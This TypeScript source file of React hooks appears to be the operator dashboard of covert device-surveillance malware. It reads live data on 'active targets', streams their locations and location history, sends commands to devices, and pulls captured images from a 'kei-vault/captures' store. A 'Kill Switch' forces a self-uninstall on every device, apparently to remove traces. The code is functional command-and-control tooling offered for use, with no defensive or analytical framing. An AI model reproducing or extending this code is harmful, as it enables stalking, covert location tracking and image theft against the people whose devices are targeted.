/**
 * Enhanced Firebase hooks with TanStack Query
 * Real-time data synchronization with caching and error handling
 */

'use client';

import { useMutation, useQueryClient } from '@tanstack/react-query';
import { ref, onValue, set, push, DatabaseReference } from 'firebase/database';
import { ref as storageRef, listAll, getBytes } from 'firebase/storage';
import { database, storage, FIREBASE_PATHS } from '@/lib/firebase';
import { Device, Location, Command, SystemLog, DashboardStats, ImageCapture } from '@/types';
import { useEffect, useState } from 'react';

/**
 * Hook to fetch all active targets in real-time
 */
export function useActiveDevices() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<Error | null>(null);

  useEffect(() => {
    const devicesRef = ref(database, FIREBASE_PATHS.ACTIVE_TARGETS);

    const unsubscribe = onValue(
      devicesRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const deviceArray: Device[] = Object.entries(data).map(([id, device]: any) => ({
            ...device,
            id,
          }));
          setDevices(deviceArray);
        } else {
          setDevices([]);
        }
        setIsLoading(false);
      },
      (err) => {
        setError(err);
        setIsLoading(false);
      }
    );

    return () => unsubscribe();
  }, []);

  return { devices, isLoading, error };
}

/**
 * Hook to fetch device locations in real-time
 */
export function useDeviceLocations() {
  const [locations, setLocations] = useState<Location[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const locationsRef = ref(database, FIREBASE_PATHS.LOCATIONS);

    const unsubscribe = onValue(
      locationsRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const locationArray: Location[] = Object.entries(data).map(([deviceId, locationData]: any) => ({
            ...locationData,
            deviceId,
          }));
          setLocations(locationArray);
        } else {
          setLocations([]);
        }
        setIsLoading(false);
      },
      () => {
        setIsLoading(false);
      }
    );

    return () => unsubscribe();
  }, []);

  return { locations, isLoading };
}

/**
 * Hook to fetch dashboard statistics
 */
export function useDashboardStats() {
  const [stats, setStats] = useState<DashboardStats>({
    totalDevices: 0,
    activeDevices: 0,
    totalStorage: 0,
    usedStorage: 0,
    activeSessions: 0,
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const statsRef = ref(database, FIREBASE_PATHS.STATS);

    const unsubscribe = onValue(
      statsRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          setStats(data);
        }
        setLoading(false);
      },
      () => {
        setLoading(false);
      }
    );

    return () => unsubscribe();
  }, []);

  return { stats, loading };
}

/**
 * Hook to fetch real-time activity logs
 */
export function useActivityLogs() {
  const [logs, setLogs] = useState<SystemLog[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const logsRef = ref(database, FIREBASE_PATHS.ACTIVITY_LOGS);

    const unsubscribe = onValue(
      logsRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const logArray: SystemLog[] = Object.entries(data)
            .map(([id, log]: any) => ({
              ...log,
              id,
            }))
            .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
          setLogs(logArray);
        } else {
          setLogs([]);
        }
        setIsLoading(false);
      },
      () => {
        setIsLoading(false);
      }
    );

    return () => unsubscribe();
  }, []);

  return { logs, isLoading };
}

/**
 * Hook to fetch system logs with filtering
 */
export function useSystemLogs(limit: number = 500) {
  const [logs, setLogs] = useState<SystemLog[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const logsRef = ref(database, FIREBASE_PATHS.SYSTEM_LOGS);

    const unsubscribe = onValue(
      logsRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const logArray: SystemLog[] = Object.entries(data)
            .map(([id, log]: any) => ({
              ...log,
              id,
            }))
            .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
            .slice(0, limit);
          setLogs(logArray);
        } else {
          setLogs([]);
        }
        setIsLoading(false);
      },
      () => {
        setIsLoading(false);
      }
    );

    return () => unsubscribe();
  }, [limit]);

  return { logs, isLoading };
}

/**
 * Mutation hook to send command to device
 */
export function useSendCommand() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async (data: { deviceId: string; action: Command['action'] }) => {
      const commandsRef = ref(database, `${FIREBASE_PATHS.COMMANDS}/${data.deviceId}`);
      const newCommandRef = push(commandsRef);

      await set(newCommandRef, {
        action: data.action,
        timestamp: Date.now(),
        status: 'pending',
      });

      return { commandId: newCommandRef.key, ...data };
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands'] });
    },
  });
}

/**
 * Mutation hook for Kill Switch - sends self-uninstall to all devices
 */
export function useKillSwitch() {
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: async (deviceIds: string[]) => {
      const killSwitchCommands = deviceIds.map(async (deviceId) => {
        const commandsRef = ref(database, `${FIREBASE_PATHS.COMMANDS}/${deviceId}`);
        const newCommandRef = push(commandsRef);

        await set(newCommandRef, {
          action: 'self_uninstall',
          timestamp: Date.now(),
          status: 'pending',
          priority: 'critical',
          force: true,
        });

        // Log kill switch activation
        const logsRef = ref(database, FIREBASE_PATHS.SYSTEM_LOGS);
        const newLogRef = push(logsRef);
        await set(newLogRef, {
          message: `KILL SWITCH ACTIVATED: Self-uninstall command sent to device ${deviceId}`,
          timestamp: Date.now(),
          type: 'error',
          device_id: deviceId,
          severity: 'critical',
        });
      });

      return Promise.all(killSwitchCommands);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['commands'] });
      queryClient.invalidateQueries({ queryKey: ['logs'] });
    },
  });
}

/**
 * Hook to fetch image captures from Firebase Storage
 */
export function useImageCaptures(deviceId?: string) {
  const [images, setImages] = useState<ImageCapture[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const loadImages = async () => {
      try {
        const capturesPath = deviceId
          ? `kei-vault/captures/${deviceId}`
          : 'kei-vault/captures';
        
        const capturesRef = storageRef(storage, capturesPath);
        const result = await listAll(capturesRef);

        const imagePromises = result.items.map(async (item) => {
          try {
            const bytes = await getBytes(item);
            const blobUrl = URL.createObjectURL(new Blob([bytes]));

            return {
              id: item.name,
              url: blobUrl,
              name: item.name,
              path: item.fullPath,
              timestamp: parseInt(item.name.split('_')[0]) || Date.now(),
            };
          } catch (error) {
            console.error(`Failed to load image ${item.name}:`, error);
            return null;
          }
        });

        const loadedImages = (await Promise.all(imagePromises)).filter(
          (img): img is ImageCapture => img !== null
        );

        setImages(loadedImages.sort((a, b) => b.timestamp - a.timestamp));
        setIsLoading(false);
      } catch (error) {
        console.error('Failed to load images:', error);
        setIsLoading(false);
      }
    };

    loadImages();
  }, [deviceId]);

  return { images, isLoading };
}

/**
 * Hook to subscribe to real-time location updates for a specific device
 */
export function useDeviceLocation(deviceId: string) {
  const [location, setLocation] = useState<Location | null>(null);
  const [history, setHistory] = useState<Location[]>([]);

  useEffect(() => {
    const locationRef = ref(database, `${FIREBASE_PATHS.DEVICE_LOCATIONS}/${deviceId}`);

    const unsubscribe = onValue(
      locationRef,
      (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const newLocation: Location = {
            ...data,
            deviceId,
          };
          setLocation(newLocation);
          setHistory((prev) => [...prev, newLocation].slice(-100)); // Keep last 100 locations
        }
      }
    );

    return () => unsubscribe();
  }, [deviceId]);

  return { location, history };
}
